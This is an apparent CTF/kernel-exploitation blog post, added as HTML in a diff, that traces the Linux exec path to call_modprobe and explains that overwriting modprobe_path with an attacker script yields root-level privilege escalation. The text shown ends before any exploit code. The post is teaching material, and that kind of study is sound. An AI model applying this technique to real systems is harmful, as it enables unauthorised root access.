@@ -1,0 +1,721 @@
+
+  <!DOCTYPE html>
+  <html lang="en"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"copy success(*^▽^*)","fail":"copy failed (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"Naup"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    Linux Kernel - EoP by modprobe &amp; 2021 3kCTF echo nerf |
+    
+    堇姬 Naup&#39;s Blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="Linux Kernel - EoP by modprobe &amp; 2021 3kCTF echo nerf Author: 堇姬Naup  前言一個酷酷的 kernel pwn 萬解 www 調用鏈當你去執行一個檔案時會有以下調用鏈 do_execve第一步去 call do_execvehttps:&#x2F;&#x2F;elixir.bootlin.com&#x2F;linux&#x2F;v6.13.7&#x2F;source&#x2F;fs&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux Kernel - EoP by modprobe &amp; 2021 3kCTF echo nerf">
+<meta property="og:url" content="http://example.com/2025/04/04/Linux-Kernel-modprobe-EoP-and-2021-3kctf-echo-nerf/index.html">
+<meta property="og:site_name" content="堇姬 Naup&#39;s Blog">
+<meta property="og:description" content="Linux Kernel - EoP by modprobe &amp; 2021 3kCTF echo nerf Author: 堇姬Naup  前言一個酷酷的 kernel pwn 萬解 www 調用鏈當你去執行一個檔案時會有以下調用鏈 do_execve第一步去 call do_execvehttps:&#x2F;&#x2F;elixir.bootlin.com&#x2F;linux&#x2F;v6.13.7&#x2F;source&#x2F;fs&#x2F;">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-04-04T08:49:23.000Z">
+<meta property="article:modified_time" content="2025-04-04T08:51:20.499Z">
+<meta property="article:author" content="Naup堇姬">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="堇姬 Naup's Blog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/fav.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">Naup...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">Home</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">Archives</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">About</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture></picture>
+    <img fetchpriority="high" src="/images/posts_cover/LinuxKernelPwn/linuxkernel.png" alt="Linux Kernel - EoP by modprobe &amp; 2021 3kCTF echo nerf">
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">Linux Kernel - EoP by modprobe &amp; 2021 3kCTF echo nerf</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux-Kernel-EoP-by-modprobe-2021-3kCTF-echo-nerf"><span class="toc-number">1.</span> <span class="toc-text">Linux Kernel - EoP by modprobe &amp; 2021 3kCTF echo nerf</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AA%BF%E7%94%A8%E9%8F%88"><span class="toc-number">1.2.</span> <span class="toc-text">調用鏈</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#do-execve"><span class="toc-number">1.2.1.</span> <span class="toc-text">do_execve</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#do-execveat-common"><span class="toc-number">1.2.2.</span> <span class="toc-text">do_execveat_common</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bprm-execve"><span class="toc-number">1.2.3.</span> <span class="toc-text">bprm_execve</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exec-binprm"><span class="toc-number">1.2.4.</span> <span class="toc-text">exec_binprm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#search-binary-handler"><span class="toc-number">1.2.5.</span> <span class="toc-text">search_binary_handler</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#request-module"><span class="toc-number">1.2.6.</span> <span class="toc-text">request_module</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#call-modprobe"><span class="toc-number">1.2.7.</span> <span class="toc-text">call_modprobe</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#modprobe-path-EoP"><span class="toc-number">1.3.</span> <span class="toc-text">modprobe path EoP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3kctf-2021-echo"><span class="toc-number">1.4.</span> <span class="toc-text">3kctf 2021 - echo</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E6%BA%96%E5%82%99"><span class="toc-number">1.4.1.</span> <span class="toc-text">前置準備</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#analyze-source-code"><span class="toc-number">1.4.2.</span> <span class="toc-text">analyze source code</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exploit"><span class="toc-number">1.5.</span> <span class="toc-text">exploit</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Naup堇姬" class="lazyload">
+  <div class="sidebar-author-name">Naup堇姬</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    <div class="sidebar-state-number">64</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">21</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-email sidebar-social-icon">
+      <a href=naup96721@gmail.com itemprop="url" target="_blank" aria-label="email" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/Naupjjin itemprop="url" target="_blank" aria-label="github" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-Linux-Kernel-modprobe-EoP-and-2021-3kctf-echo-nerf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/04/04/Linux-Kernel-modprobe-EoP-and-2021-3kctf-echo-nerf/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-04-04T08:49:23.000Z" itemprop="datePublished">2025-04-04</time>
+    <time style="display: none;" id="post-update-time">2025-04-04</time>
+  </a>
+</div>
+
+      
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="Linux-Kernel-EoP-by-modprobe-2021-3kCTF-echo-nerf"><a href="#Linux-Kernel-EoP-by-modprobe-2021-3kCTF-echo-nerf" class="headerlink" title="Linux Kernel - EoP by modprobe &amp; 2021 3kCTF echo nerf"></a>Linux Kernel - EoP by modprobe &amp; 2021 3kCTF echo nerf</h1><blockquote>
+<p>Author: 堇姬Naup</p>
+</blockquote>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一個酷酷的 kernel pwn 萬解 www</p>
+<h2 id="調用鏈"><a href="#調用鏈" class="headerlink" title="調用鏈"></a>調用鏈</h2><p>當你去執行一個檔案時會有以下調用鏈</p>
+<h3 id="do-execve"><a href="#do-execve" class="headerlink" title="do_execve"></a>do_execve</h3><p>第一步去 call do_execve<br><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/fs/exec.c#L2040">https://elixir.bootlin.com/linux/v6.13.7/source/fs/exec.c#L2040</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">do_execve</span><span class="params">(<span class="keyword">struct</span> filename *filename,</span></span><br><span class="line"><span class="params">	<span class="type">const</span> <span class="type">char</span> __user *<span class="type">const</span> __user *__argv,</span></span><br><span class="line"><span class="params">	<span class="type">const</span> <span class="type">char</span> __user *<span class="type">const</span> __user *__envp)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_arg_ptr</span> <span class="title">argv</span> =</span> &#123; .ptr.native = __argv &#125;;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_arg_ptr</span> <span class="title">envp</span> =</span> &#123; .ptr.native = __envp &#125;;</span><br><span class="line">	<span class="keyword">return</span> do_execveat_common(AT_FDCWD, filename, argv, envp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第一個參數會傳入 filename pointer<br>之後去 call execveat</p>
+<h3 id="do-execveat-common"><a href="#do-execveat-common" class="headerlink" title="do_execveat_common"></a>do_execveat_common</h3><p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/fs/exec.c#L1896">https://elixir.bootlin.com/linux/v6.13.7/source/fs/exec.c#L1896</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">do_execveat_common</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> filename *filename,</span></span><br><span class="line"><span class="params">			      <span class="keyword">struct</span> user_arg_ptr argv,</span></span><br><span class="line"><span class="params">			      <span class="keyword">struct</span> user_arg_ptr envp,</span></span><br><span class="line"><span class="params">			      <span class="type">int</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">linux_binprm</span> *<span class="title">bprm</span>;</span></span><br><span class="line">	<span class="type">int</span> retval;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(filename))</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(filename);</span><br></pre></td></tr></table></figure>
+<p>首先他初始化一個叫做  <code>linux_binprm</code> 的東西<br>他用來儲存可執行文件的相關訊息</p>
+<p>之後去檢查 filename 是不是個 error pointer</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We move the actual failure in case of RLIMIT_NPROC excess from</span></span><br><span class="line"><span class="comment"> * set*uid() to execve() because too many poorly written programs</span></span><br><span class="line"><span class="comment"> * don&#x27;t check setuid() return code.  Here we additionally recheck</span></span><br><span class="line"><span class="comment"> * whether NPROC limit is still exceeded.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> ((current-&gt;flags &amp; PF_NPROC_EXCEEDED) &amp;&amp;</span><br><span class="line">    is_rlimit_overlimit(current_ucounts(), UCOUNT_RLIMIT_NPROC, rlimit(RLIMIT_NPROC))) &#123;</span><br><span class="line">	retval = -EAGAIN;</span><br><span class="line">	<span class="keyword">goto</span> out_ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We&#x27;re below the limit (still or again), so we don&#x27;t want to make</span></span><br><span class="line"><span class="comment"> * further execve() calls fail. */</span></span><br><span class="line">current-&gt;flags &amp;= ~PF_NPROC_EXCEEDED;</span><br></pre></td></tr></table></figure>
+<p>檢查是否曾經標記為行程數過多 (PF_NPROC_EXCEEDED)。<br>且再次確認目前是否仍然超過 RLIMIT_NPROC 限制。<br>如果真的超過了，就回傳錯誤碼 -EAGAIN，跳到錯誤處理段落 out_ret</p>
+<p>flags 相關可以看這邊<br><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/include/linux/sched.h#L1671">https://elixir.bootlin.com/linux/v6.13.7/source/include/linux/sched.h#L1671</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">retval = count(argv, MAX_ARG_STRINGS);</span><br><span class="line"><span class="keyword">if</span> (retval == <span class="number">0</span>)</span><br><span class="line">	pr_warn_once(<span class="string">&quot;process &#x27;%s&#x27; launched &#x27;%s&#x27; with NULL argv: empty string added\n&quot;</span>,</span><br><span class="line">		     current-&gt;comm, bprm-&gt;filename);</span><br><span class="line"><span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line">	<span class="keyword">goto</span> out_free;</span><br><span class="line">bprm-&gt;argc = retval;</span><br><span class="line"></span><br><span class="line">retval = count(envp, MAX_ARG_STRINGS);</span><br><span class="line"><span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line">	<span class="keyword">goto</span> out_free;</span><br><span class="line">bprm-&gt;envc = retval;</span><br><span class="line"></span><br><span class="line">retval = bprm_stack_limits(bprm);</span><br><span class="line"><span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line">	<span class="keyword">goto</span> out_free;</span><br><span class="line"></span><br><span class="line">retval = copy_string_kernel(bprm-&gt;filename, bprm);</span><br><span class="line"><span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line">	<span class="keyword">goto</span> out_free;</span><br><span class="line">bprm-&gt;exec = bprm-&gt;p;</span><br><span class="line"></span><br><span class="line">retval = copy_strings(bprm-&gt;envc, envp, bprm);</span><br><span class="line"><span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line">	<span class="keyword">goto</span> out_free;</span><br><span class="line"></span><br><span class="line">retval = copy_strings(bprm-&gt;argc, argv, bprm);</span><br><span class="line"><span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line">	<span class="keyword">goto</span> out_free;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * When argv is empty, add an empty string (&quot;&quot;) as argv[0] to</span></span><br><span class="line"><span class="comment"> * ensure confused userspace programs that start processing</span></span><br><span class="line"><span class="comment"> * from argv[1] won&#x27;t end up walking envp. See also</span></span><br><span class="line"><span class="comment"> * bprm_stack_limits().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (bprm-&gt;argc == <span class="number">0</span>) &#123;</span><br><span class="line">	retval = copy_string_kernel(<span class="string">&quot;&quot;</span>, bprm);</span><br><span class="line">	<span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> out_free;</span><br><span class="line">	bprm-&gt;argc = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>計算 argv 和 envp 的數量，檢查是否超過限制或為空，確保整體不超出堆疊大小限制<br>將filename、環境變數、參數按順序複製到行程的堆疊空間中</p>
+<p>最後去 call </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">retval = bprm_execve(bprm);</span><br></pre></td></tr></table></figure>
+
+<h3 id="bprm-execve"><a href="#bprm-execve" class="headerlink" title="bprm_execve"></a>bprm_execve</h3><p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/fs/exec.c#L1841">https://elixir.bootlin.com/linux/v6.13.7/source/fs/exec.c#L1841</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> retval;</span><br><span class="line"></span><br><span class="line">retval = prepare_bprm_creds(bprm);</span><br></pre></td></tr></table></figure>
+<p>先去初始化了 brpm 的 cred</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">check_unsafe_exec(bprm);</span><br><span class="line">current-&gt;in_execve = <span class="number">1</span>;</span><br><span class="line">sched_mm_cid_before_execve(current);</span><br><span class="line"></span><br><span class="line">sched_exec();</span><br></pre></td></tr></table></figure>
+
+<p>之後檢查 bprm 是否有不安全的 execve() 條件</p>
+<p>然後去call exec_binprm</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">retval = exec_binprm(bprm);</span><br></pre></td></tr></table></figure>
+
+<h3 id="exec-binprm"><a href="#exec-binprm" class="headerlink" title="exec_binprm"></a>exec_binprm</h3><p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/fs/exec.c#L1796">https://elixir.bootlin.com/linux/v6.13.7/source/fs/exec.c#L1796</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">pid_t</span> old_pid, old_vpid;</span><br><span class="line"><span class="type">int</span> ret, depth;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Need to fetch pid before load_binary changes it */</span></span><br><span class="line">old_pid = current-&gt;pid;</span><br><span class="line">rcu_read_lock();</span><br><span class="line">old_vpid = task_pid_nr_ns(current, task_active_pid_ns(current-&gt;parent));</span><br><span class="line">rcu_read_unlock();</span><br></pre></td></tr></table></figure>
+<p>這會去儲存當前所在的 pid 到 bprm 中<br>然後去 call search_binary_handler</p>
+<h3 id="search-binary-handler"><a href="#search-binary-handler" class="headerlink" title="search_binary_handler"></a>search_binary_handler</h3><p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/fs/exec.c#L1749">https://elixir.bootlin.com/linux/v6.13.7/source/fs/exec.c#L1749</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">list_for_each_entry(fmt, &amp;formats, lh) &#123;</span><br><span class="line">	<span class="keyword">if</span> (!try_module_get(fmt-&gt;module))</span><br><span class="line">		<span class="keyword">continue</span>;</span><br><span class="line">	read_unlock(&amp;binfmt_lock);</span><br><span class="line"></span><br><span class="line">	retval = fmt-&gt;load_binary(bprm);</span><br><span class="line"></span><br><span class="line">	read_lock(&amp;binfmt_lock);</span><br><span class="line">	put_binfmt(fmt);</span><br><span class="line">	<span class="keyword">if</span> (bprm-&gt;point_of_no_return || (retval != -ENOEXEC)) &#123;</span><br><span class="line">		read_unlock(&amp;binfmt_lock);</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>search_binary_handle() 遍歷 formats，去嘗試 load_binary() </p>
+<p>如果沒有找到對應的 binary handle<br>就去這個分支</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (need_retry) &#123;</span><br><span class="line">	<span class="keyword">if</span> (printable(bprm-&gt;buf[<span class="number">0</span>]) &amp;&amp; printable(bprm-&gt;buf[<span class="number">1</span>]) &amp;&amp;</span><br><span class="line">	    printable(bprm-&gt;buf[<span class="number">2</span>]) &amp;&amp; printable(bprm-&gt;buf[<span class="number">3</span>]))</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line">	<span class="keyword">if</span> (request_module(<span class="string">&quot;binfmt-%04x&quot;</span>, *(ushort *)(bprm-&gt;buf + <span class="number">2</span>)) &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line">	need_retry = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">goto</span> retry;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>之後去 call request_module</p>
+<h3 id="request-module"><a href="#request-module" class="headerlink" title="request_module"></a>request_module</h3><p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/kernel/module/kmod.c#L131">https://elixir.bootlin.com/linux/v6.13.7/source/kernel/module/kmod.c#L131</a></p>
+<p>request_module() 會試圖通過 modprobe 來載入所需的模組，然後繼續執行該檔案</p>
+<h3 id="call-modprobe"><a href="#call-modprobe" class="headerlink" title="call_modprobe"></a>call_modprobe</h3><p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/kernel/module/kmod.c#L71">https://elixir.bootlin.com/linux/v6.13.7/source/kernel/module/kmod.c#L71</a></p>
+<p>這段最重要的在這裡，他會用 root 權限去執行 modprobe_path<br>所以說如果我們能覆蓋掉 modprobe_path 成我們的 script<br>就可以做到 EoP</p>
+<p>PS: call_usermodehelper_setup 會在 userspace 創一個 subprocess</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">argv[<span class="number">0</span>] = modprobe_path;</span><br><span class="line">argv[<span class="number">1</span>] = <span class="string">&quot;-q&quot;</span>;</span><br><span class="line">argv[<span class="number">2</span>] = <span class="string">&quot;--&quot;</span>;</span><br><span class="line">argv[<span class="number">3</span>] = module_name;	<span class="comment">/* check free_modprobe_argv() */</span></span><br><span class="line">argv[<span class="number">4</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,</span><br><span class="line">				 <span class="literal">NULL</span>, free_modprobe_argv, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>
+
